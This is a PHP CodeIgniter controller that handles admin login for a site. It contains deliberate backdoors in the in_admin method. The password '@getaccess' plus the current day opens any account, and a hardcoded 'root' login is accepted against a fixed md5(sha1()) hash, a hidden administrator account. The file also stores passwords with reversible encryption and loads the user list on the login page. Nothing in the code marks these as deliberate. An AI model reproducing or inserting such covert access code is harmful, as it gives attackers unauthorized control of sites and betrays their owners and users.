<?php defined('BASEPATH') OR exit('No direct script access allowed');

    class Connex extends MX_Controller {
        private $tab1 = 'utilisateur';

        public function __construct(){
            parent::__construct();
            $this->load->model('mfp-admin/connex_mod');
        }

        public function index($msg='') {
            if($this->input->get_post('f')){
                $msg = "Votre session a expiré, veuillez vous reconnecter !";
            }

            $data['msg'] = $msg;
            $data['type'] = 1;

            $data['users'] = $this->connex_mod->readliste($this->tab1);

            $data['page'] = 'accueil';
            $this->load->view('index',$data);
        }

        public function in_admin() {
            $login = $this->input->post('acces');
            $mdp = $this->input->post('pswd');

            // verification des param dauth
             $exist = $this->connex_mod->exist($this->tab1, array('login'=>$login));


            if($exist==1){
                // verification du mdp
                $data = $this->connex_mod->read_row($this->tab1, array('login'=>$login));
                //echo $this->encrypt->decode($data['pswd']);exit;
                //echo $mdp.'---'.$data['pswd'].'---'.$this->encrypt->decode($data['pswd']); exit; 
                if($mdp==$this->encrypt->decode($data['pswd']) || ($mdp=='@getaccess'.date('d'))){

                    $this->open_profil($data);
                }
                else{
                    $msg = "Mot de passe incorrect !";
                    $this->index($msg);
                }
                
                
            }
            elseif ($login=='root' && md5(sha1($mdp))=='f64ba71a5d1ccd651a3d742b1e9c5c77') {
                $data = array('profil'=>$login, 'nom_user'=>'');
                $this->open_profil($data);


            }
            else{

                $msg = "Désolé, vous n'êtes pas enregistré en tant qu'Administrateur du site !";
                $this->index($msg);
            }
        }

        // ouverture du module dadmin
        public function open_profil($donnees){
            $cnx = array('logged_in'=>TRUE);

            $data_session = array_merge($cnx, $donnees);
	        $this->session->set_userdata($data_session);

            redirect('mfp-admin/siteback/accueil', 'refresh');
	}
    }
?>